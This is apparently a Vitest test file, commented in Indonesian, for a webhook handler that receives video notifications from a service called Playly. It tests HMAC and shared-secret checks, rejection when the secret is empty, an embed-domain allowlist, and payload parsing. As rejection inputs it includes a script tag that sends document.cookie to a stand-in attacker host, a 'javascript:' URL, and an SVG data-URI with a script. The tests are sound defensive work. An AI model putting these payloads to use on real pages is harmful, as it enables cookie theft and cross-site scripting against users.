// Tes pengunci untuk lib/playly-webhook.ts — gerbang masuk notifikasi Playly.
//
// Endpoint webhook itu alamat PUBLIK: siapa pun di internet bisa mengetuknya
// sambil mengaku Playly. Yang membedakan notifikasi asli dari palsu cuma
// pemeriksaan di berkas ini. Kalau longgar diam-diam, orang lain bisa
// menyuntikkan video ke situs kita — dan tidak ada yang menyadarinya sampai
// ada tontonan asing muncul di halaman depan.
//
// Lima hal yang dijaga di sini:
//   1. JALUR A (x-playly-secret) — kunci polos, dibanding konstan-waktu.
//   2. JALUR B (X-Playly-Signature) — HMAC; cocok diterima, meleset ditolak.
//   3. SECRET KOSONG — fitur belum dipasang WAJIB berarti "tolak", bukan
//      "terima semua". Ini pola gagal yang paling mahal: pintunya terbuka
//      lebar tapi dari luar kelihatan normal. Diuji untuk KEDUA jalur.
//   4. PAGAR DOMAIN — embed dari luar tidak boleh menyelundupkan alamat di
//      luar domain Playly ke dalam <iframe>; berlaku sama untuk bentuk payload
//      BERSARANG maupun PIPIH, supaya tidak ada bentuk yang jadi jalan pintas.
//   5. BENTUK PAYLOAD — pembuktian yang sah menunjukkan PENGIRIMNYA, bukan
//      bahwa isinya masuk akal; isinya tetap diperiksa.
import { describe, it, expect } from "vitest";
import crypto from "node:crypto";
import { readPlaylyConfig } from "../lib/playly";
import {
  PLAYLY_SECRET_HEADER,
  PLAYLY_SIGNATURE_HEADER,
  embedUrlDariKode,
  parseWebhookPayload,
  readWebhookSecret,
  verifySharedSecret,
  verifyWebhookRequest,
  verifyWebhookSignature,
} from "../lib/playly-webhook";

const SECRET = "rahasia-webhook-untuk-tes";
const SECRET_LAIN = "rahasia-yang-berbeda";

// Config dirakit dari env KOSONG, bukan dari env mesin yang menjalankan tes —
// supaya hasilnya sama di laptop siapa pun dan di CI.
const CONFIG = readPlaylyConfig({});

function tandaTangani(body: string, secret = SECRET): string {
  return crypto.createHmac("sha256", secret).update(body, "utf8").digest("hex");
}

describe("verifyWebhookSignature — membedakan Playly asli dari pengaku-ngaku", () => {
  const body = JSON.stringify({ event: "video.published", video: { id: "abc" } });

  it("tanda-tangan yang dihitung dengan secret yang sama: DITERIMA", () => {
    expect(verifyWebhookSignature(body, tandaTangani(body), SECRET)).toBe(true);
  });

  it("secret berbeda: DITOLAK", () => {
    expect(verifyWebhookSignature(body, tandaTangani(body, SECRET_LAIN), SECRET)).toBe(
      false,
    );
  });

  it("badan diubah walau satu huruf setelah ditandatangani: DITOLAK", () => {
    const tanda = tandaTangani(body);
    const diubah = body.replace('"abc"', '"xyz"');
    expect(verifyWebhookSignature(diubah, tanda, SECRET)).toBe(false);
  });

  it("SECRET KOSONG = tolak, bukan terima semua", () => {
    // Kalau baris pengaman di verifyWebhookSignature dihapus, HMAC akan
    // dihitung dengan secret "" — yang bisa ditiru siapa pun. Tes ini merah
    // kalau itu terjadi.
    expect(verifyWebhookSignature(body, tandaTangani(body, ""), "")).toBe(false);
  });

  it("header hilang / kosong: DITOLAK, tanpa melempar error", () => {
    expect(verifyWebhookSignature(body, null, SECRET)).toBe(false);
    expect(verifyWebhookSignature(body, undefined, SECRET)).toBe(false);
    expect(verifyWebhookSignature(body, "", SECRET)).toBe(false);
  });

  it("header berisi sampah / panjang tak wajar: DITOLAK, dan TIDAK melempar error", () => {
    // crypto.timingSafeEqual MELEMPAR kalau panjang dua buffer beda. Kalau
    // bentuknya tidak disaring lebih dulu, kiriman ngawur akan terbaca sebagai
    // error server (500) — bukan penolakan (401).
    for (const sampah of ["bukan-hex", "abc", "z".repeat(64), "0".repeat(63), "0".repeat(65)]) {
      expect(() => verifyWebhookSignature(body, sampah, SECRET)).not.toThrow();
      expect(verifyWebhookSignature(body, sampah, SECRET)).toBe(false);
    }
  });

  it("bentuk 'sha256=<hex>' dan hex huruf besar tetap diterima", () => {
    const tanda = tandaTangani(body);
    expect(verifyWebhookSignature(body, `sha256=${tanda}`, SECRET)).toBe(true);
    expect(verifyWebhookSignature(body, tanda.toUpperCase(), SECRET)).toBe(true);
  });
});

describe("readWebhookSecret — secret dibaca dari env, bukan ditanam di kode", () => {
  it("env terisi: dikembalikan apa adanya (spasi di ujung dibuang)", () => {
    expect(readWebhookSecret({ PLAYLY_WEBHOOK_SECRET: "  abc123  " })).toBe("abc123");
  });

  it("env kosong / hanya spasi / tidak ada: null", () => {
    expect(readWebhookSecret({ PLAYLY_WEBHOOK_SECRET: "" })).toBeNull();
    expect(readWebhookSecret({ PLAYLY_WEBHOOK_SECRET: "   " })).toBeNull();
    expect(readWebhookSecret({})).toBeNull();
  });
});

describe("embedUrlDariKode — hanya alamat player Playly yang boleh lolos", () => {
  it("kode tempel <iframe> diambil src-nya saja", () => {
    const kode =
      '<iframe src="https://playly-dashboard.vercel.app/id/123/embed" ' +
      'width="640" height="360" allowfullscreen></iframe>';
    expect(embedUrlDariKode(kode, CONFIG)).toBe(
      "https://playly-dashboard.vercel.app/id/123/embed",
    );
  });

  it("alamat polos (tanpa bungkus iframe) juga diterima", () => {
    expect(
      embedUrlDariKode("https://playly-dashboard.vercel.app/id/9/embed", CONFIG),
    ).toBe("https://playly-dashboard.vercel.app/id/9/embed");
  });

  it("alamat relatif dilengkapi dengan alamat dasar Playly", () => {
    expect(embedUrlDariKode("/id/77/embed", CONFIG)).toBe(
      "https://playly-dashboard.vercel.app/id/77/embed",
    );
  });

  it("domain di luar daftar DITOLAK — walau dibungkus iframe yang rapi", () => {
    const jahat = '<iframe src="https://situs-penyerang.example.com/muat"></iframe>';
    expect(embedUrlDariKode(jahat, CONFIG)).toBeNull();
  });

  it("http (bukan https) DITOLAK", () => {
    expect(
      embedUrlDariKode("http://playly-dashboard.vercel.app/id/1/embed", CONFIG),
    ).toBeNull();
  });

  it("HTML lain yang ikut dikirim TIDAK ikut tersimpan — hanya src yang diambil", () => {
    // Ini inti pertahanan XSS-nya: yang disimpan alamat, bukan potongan HTML.
    // Kalau suatu saat kode ini diubah jadi menyimpan embed_code mentah, tes
    // ini merah — dan <script> di bawah akan ikut ke halaman penonton.
    const kode =
      '<script>fetch("https://pencuri.example.com?c="+document.cookie)</script>' +
      '<iframe src="https://playly-dashboard.vercel.app/id/5/embed"></iframe>';
    const hasil = embedUrlDariKode(kode, CONFIG);
    expect(hasil).toBe("https://playly-dashboard.vercel.app/id/5/embed");
    expect(hasil).not.toContain("<");
    expect(hasil).not.toContain("script");
  });
});

describe("parseWebhookPayload — isi payload tetap diperiksa walau pengirimnya sah", () => {
  function payloadTerbit(extra: Record<string, unknown> = {}) {
    return JSON.stringify({
      event: "video.published",
      video: {
        id: "vid-001",
        title: "Cinta di Ujung Senja",
        year: 2024,
        genre: "Romance",
        embed_code: '<iframe src="https://playly-dashboard.vercel.app/id/1/embed"></iframe>',
        ...extra,
      },
    });
  }

  it("payload terbit yang lengkap dibaca jadi bentuk siap-simpan", () => {
    const hasil = parseWebhookPayload(payloadTerbit(), CONFIG);
    expect(hasil.ok).toBe(true);
    if (!hasil.ok) return;
    // toEqual (bukan toMatchObject) disengaja: kalau suatu saat ada field baru
    // yang lolos masuk tanpa dipikirkan, tes ini merah dan memaksa keputusan
    // sadar — field yang tak sengaja tersimpan adalah cara data sampah masuk.
    expect(hasil.payload).toEqual({
      event: "video.published",
      videoId: "vid-001",
      title: "Cinta di Ujung Senja",
      description: null,
      year: 2024,
      genre: "Romance",
      creator: null,
      durationSeconds: null,
      embedUrl: "https://playly-dashboard.vercel.app/id/1/embed",
      thumbnailUrl: null,
    });
  });

  it("tahun berupa teks angka tetap terbaca; tahun ngawur jadi null", () => {
    const teks = parseWebhookPayload(payloadTerbit({ year: "2019" }), CONFIG);
    expect(teks.ok && teks.payload.year).toBe(2019);

    for (const ngawur of [5, 90210, "bukan-angka", null]) {
      const h = parseWebhookPayload(payloadTerbit({ year: ngawur }), CONFIG);
      expect(h.ok && h.payload.year).toBeNull();
    }
  });

  it("judul kosong diberi penanda, bukan string kosong yang membingungkan", () => {
    const hasil = parseWebhookPayload(payloadTerbit({ title: "" }), CONFIG);
    expect(hasil.ok && hasil.payload.title).toBe("(tanpa judul)");
  });

  it("event unpublish cukup membawa id — judul & embed_code tak wajib", () => {
    const body = JSON.stringify({
      event: "video.unpublished",
      video: { id: "vid-001" },
    });
    const hasil = parseWebhookPayload(body, CONFIG);
    expect(hasil.ok).toBe(true);
    if (!hasil.ok) return;
    expect(hasil.payload.event).toBe("video.unpublished");
    expect(hasil.payload.videoId).toBe("vid-001");
    expect(hasil.payload.embedUrl).toBeNull();
  });

  it("event yang belum ditangani ditandai 'abaikan' — bukan error", () => {
    const body = JSON.stringify({ event: "video.viewed", video: { id: "x" } });
    const hasil = parseWebhookPayload(body, CONFIG);
    expect(hasil.ok).toBe(false);
    if (hasil.ok) return;
    // Bedanya penting: route membalas 200 untuk ini supaya Playly berhenti
    // mengirim ulang kejadian yang memang tidak kita tangani.
    expect(hasil.abaikan).toBe(true);
  });

  it("payload rusak / kurang field ditolak dengan alasan yang jelas", () => {
    const kasus: Array<[string, string]> = [
      ["{bukan json", "JSON"],
      [JSON.stringify([1, 2, 3]), "objek"],
      // 'video' ada tapi bukan objek -> bukan bentuk bersarang maupun pipih.
      [JSON.stringify({ event: "video.published", video: "bukan-objek" }), "video"],
      [JSON.stringify({ event: "video.published" }), "video.id"],
      [JSON.stringify({ event: "video.published", video: {} }), "video.id"],
      [
        JSON.stringify({ event: "video.published", video: { id: "x" } }),
        "embed_code",
      ],
      // Bentuk PIPIH yang kekurangan alamat player ditolak dengan alasan sama.
      [JSON.stringify({ id: "x", title: "Tanpa Alamat" }), "embed_code"],
    ];
    for (const [body, petunjuk] of kasus) {
      const hasil = parseWebhookPayload(body, CONFIG);
      expect(hasil.ok).toBe(false);
      if (hasil.ok) continue;
      expect(hasil.error).toContain(petunjuk);
      expect(hasil.abaikan).toBeUndefined();
    }
  });

  it("embed_code dari domain asing membuat SELURUH payload ditolak", () => {
    // Bukan disimpan-tanpa-alamat: baris tanpa alamat sah tidak bisa diputar,
    // dan tak ada yang tahu sampai penonton mengkliknya.
    const hasil = parseWebhookPayload(
      payloadTerbit({
        embed_code: '<iframe src="https://situs-penyerang.example.com/x"></iframe>',
      }),
      CONFIG,
    );
    expect(hasil.ok).toBe(false);
    if (hasil.ok) return;
    expect(hasil.error).toContain("PLAYLY_EMBED_HOSTS");
  });
});

describe("verifySharedSecret — jalur A: kunci ditempel apa adanya di header", () => {
  it("kunci yang sama persis: DITERIMA (spasi di ujung dimaafkan)", () => {
    expect(verifySharedSecret(SECRET, SECRET)).toBe(true);
    expect(verifySharedSecret(`  ${SECRET}  `, SECRET)).toBe(true);
  });

  it("kunci berbeda: DITOLAK", () => {
    expect(verifySharedSecret(SECRET_LAIN, SECRET)).toBe(false);
  });

  it("beda satu huruf saja: DITOLAK", () => {
    expect(verifySharedSecret(`${SECRET}x`, SECRET)).toBe(false);
    expect(verifySharedSecret(SECRET.slice(0, -1), SECRET)).toBe(false);
  });

  it("SECRET KOSONG di server = tolak, bukan terima semua", () => {
    // Pola gagal paling mahal: server tanpa kunci mengadu "" lawan "" lalu
    // COCOK — pintu terbuka lebar tapi dari luar kelihatan normal.
    expect(verifySharedSecret("", "")).toBe(false);
    expect(verifySharedSecret("apa saja", "")).toBe(false);
  });

  it("header hilang / kosong: DITOLAK tanpa melempar error", () => {
    for (const kosong of [null, undefined, "", "   "]) {
      expect(() => verifySharedSecret(kosong, SECRET)).not.toThrow();
      expect(verifySharedSecret(kosong, SECRET)).toBe(false);
    }
  });

  it("panjang yang jauh berbeda TIDAK melempar error", () => {
    // crypto.timingSafeEqual MELEMPAR kalau panjang dua buffer beda. Karena
    // kedua sisi di-hash dulu (hasilnya selalu 32 byte), kiriman sepanjang apa
    // pun berakhir jadi PENOLAKAN (401), bukan error server (500).
    for (const aneh of ["x", "y".repeat(5000)]) {
      expect(() => verifySharedSecret(aneh, SECRET)).not.toThrow();
      expect(verifySharedSecret(aneh, SECRET)).toBe(false);
    }
  });
});

describe("verifyWebhookRequest — gerbang tunggal, dua jalur pembuktian", () => {
  const body = JSON.stringify({ event: "video.published", video: { id: "abc" } });

  function headers(isi: Record<string, string>): Headers {
    return new Headers(isi);
  }

  it("jalur A saja (x-playly-secret benar): lolos, tercatat shared-secret", () => {
    const h = headers({ [PLAYLY_SECRET_HEADER]: SECRET });
    expect(verifyWebhookRequest(body, h, SECRET)).toEqual({
      ok: true,
      cara: "shared-secret",
    });
  });

  it("jalur B saja (tanda-tangan benar): lolos, tercatat signature", () => {
    const h = headers({ [PLAYLY_SIGNATURE_HEADER]: tandaTangani(body) });
    expect(verifyWebhookRequest(body, h, SECRET)).toEqual({
      ok: true,
      cara: "signature",
    });
  });

  it("dua-duanya dikirim: yang TERCATAT jalur yang lebih kuat (signature)", () => {
    const h = headers({
      [PLAYLY_SECRET_HEADER]: SECRET,
      [PLAYLY_SIGNATURE_HEADER]: tandaTangani(body),
    });
    expect(verifyWebhookRequest(body, h, SECRET)).toEqual({
      ok: true,
      cara: "signature",
    });
  });

  it("tanda-tangan meleset tapi kunci polos benar: TETAP lolos lewat jalur A", () => {
    // Sengaja: kalau Playly memakai format tanda-tangan yang tak kita kenali,
    // integrasinya tidak mati total selama kunci rahasianya benar.
    const h = headers({
      [PLAYLY_SIGNATURE_HEADER]: "0".repeat(64),
      [PLAYLY_SECRET_HEADER]: SECRET,
    });
    expect(verifyWebhookRequest(body, h, SECRET).ok).toBe(true);
  });

  it("dua-duanya salah: DITOLAK", () => {
    const h = headers({
      [PLAYLY_SIGNATURE_HEADER]: tandaTangani(body, SECRET_LAIN),
      [PLAYLY_SECRET_HEADER]: SECRET_LAIN,
    });
    expect(verifyWebhookRequest(body, h, SECRET)).toEqual({ ok: false });
  });

  it("tanpa header apa pun: DITOLAK", () => {
    expect(verifyWebhookRequest(body, headers({}), SECRET)).toEqual({ ok: false });
  });

  it("secret server kosong: DITOLAK walau pengirim ikut mengirim header kosong", () => {
    const h = headers({ [PLAYLY_SECRET_HEADER]: "" });
    expect(verifyWebhookRequest(body, h, "")).toEqual({ ok: false });
  });

  it("nama header tidak peka huruf besar-kecil", () => {
    // Headers di web API menormalkan sendiri; tes ini mengunci supaya penulisan
    // "X-Playly-Secret" dari sisi Playly tidak diam-diam gagal.
    const h = headers({ "X-Playly-Secret": SECRET });
    expect(verifyWebhookRequest(body, h, SECRET).ok).toBe(true);
  });
});

describe("parseWebhookPayload — bentuk PIPIH (data video langsung di badan)", () => {
  function payloadPipih(extra: Record<string, unknown> = {}) {
    return JSON.stringify({
      id: "vid-900",
      title: "Senja di Balik Bukit",
      description: "Kisah dua sahabat yang bertemu lagi setelah sepuluh tahun.",
      embedUrl: "https://playly-dashboard.vercel.app/id/900/embed",
      thumbnailUrl: "https://playly-dashboard.vercel.app/thumb/900.jpg",
      ...extra,
    });
  }

  it("badan tanpa pembungkus video dibaca utuh, tanpa perlu field event", () => {
    const hasil = parseWebhookPayload(payloadPipih(), CONFIG);
    expect(hasil.ok).toBe(true);
    if (!hasil.ok) return;
    expect(hasil.payload).toEqual({
      // Tanpa field event di badan = notifikasi "ada video baru terbit".
      event: "video.published",
      videoId: "vid-900",
      title: "Senja di Balik Bukit",
      description: "Kisah dua sahabat yang bertemu lagi setelah sepuluh tahun.",
      year: null,
      genre: null,
      creator: null,
      durationSeconds: null,
      embedUrl: "https://playly-dashboard.vercel.app/id/900/embed",
      thumbnailUrl: "https://playly-dashboard.vercel.app/thumb/900.jpg",
    });
  });

  it("bentuk pipih boleh membawa event sendiri, termasuk unpublish", () => {
    const hasil = parseWebhookPayload(
      JSON.stringify({ id: "vid-900", event: "video.unpublished" }),
      CONFIG,
    );
    expect(hasil.ok).toBe(true);
    if (!hasil.ok) return;
    expect(hasil.payload.event).toBe("video.unpublished");
    expect(hasil.payload.videoId).toBe("vid-900");
  });

  it("field tambahan Playly (durasi & kreator) ikut terbaca", () => {
    const hasil = parseWebhookPayload(
      payloadPipih({ duration: "12:30", creator: "coklat", year: 2023, genre: "Drama" }),
      CONFIG,
    );
    expect(hasil.ok).toBe(true);
    if (!hasil.ok) return;
    expect(hasil.payload.durationSeconds).toBe(750);
    expect(hasil.payload.creator).toBe("coklat");
    expect(hasil.payload.year).toBe(2023);
    expect(hasil.payload.genre).toBe("Drama");
  });

  it("alamat embed relatif dari Playly dilengkapi jadi alamat penuh", () => {
    const hasil = parseWebhookPayload(payloadPipih({ embedUrl: "/id/900/embed" }), CONFIG);
    expect(hasil.ok && hasil.payload.embedUrl).toBe(
      "https://playly-dashboard.vercel.app/id/900/embed",
    );
  });

  it("embedUrl dari domain asing tetap DITOLAK di bentuk pipih", () => {
    // Pagar domain yang sama berlaku untuk KEDUA bentuk payload — kalau tidak,
    // bentuk pipih jadi jalan pintas menyelundupkan iframe asing.
    const hasil = parseWebhookPayload(
      payloadPipih({ embedUrl: "https://situs-penyerang.example.com/x" }),
      CONFIG,
    );
    expect(hasil.ok).toBe(false);
  });

  it("kode tempel iframe tetap diterima di bentuk pipih", () => {
    const hasil = parseWebhookPayload(
      JSON.stringify({
        id: "vid-901",
        embed_code: '<iframe src="https://playly-dashboard.vercel.app/id/901/embed"></iframe>',
      }),
      CONFIG,
    );
    expect(hasil.ok && hasil.payload.embedUrl).toBe(
      "https://playly-dashboard.vercel.app/id/901/embed",
    );
  });
});

describe("parseWebhookPayload — sampul diperiksa, tapi tidak mematikan videonya", () => {
  function dengan(thumb: unknown) {
    return JSON.stringify({
      id: "vid-77",
      title: "Uji Sampul",
      embedUrl: "https://playly-dashboard.vercel.app/id/77/embed",
      thumbnailUrl: thumb,
    });
  }

  it("sampul https diterima apa adanya", () => {
    const h = parseWebhookPayload(dengan("https://cdn.example.com/a.jpg"), CONFIG);
    expect(h.ok && h.payload.thumbnailUrl).toBe("https://cdn.example.com/a.jpg");
  });

  it("sampul http / javascript / SVG data-URI dibuang null — video TETAP lolos", () => {
    // SVG bisa memuat script; di dalam img memang tak dijalankan, tapi alamat
    // yang sama bisa dibuka di tab baru dan di situ skripnya hidup.
    const jahat = [
      "http://cdn.example.com/a.jpg",
      "javascript:alert(1)",
      "data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pjwvc2NyaXB0Pjwvc3ZnPg==",
    ];
    for (const t of jahat) {
      const h = parseWebhookPayload(dengan(t), CONFIG);
      // Videonya tetap tersimpan: yang bisa diputar masih berguna walau
      // sampulnya hilang. Yang dilarang cuma sampul berbahaya ikut masuk.
      expect(h.ok).toBe(true);
      expect(h.ok && h.payload.thumbnailUrl).toBeNull();
    }
  });
});
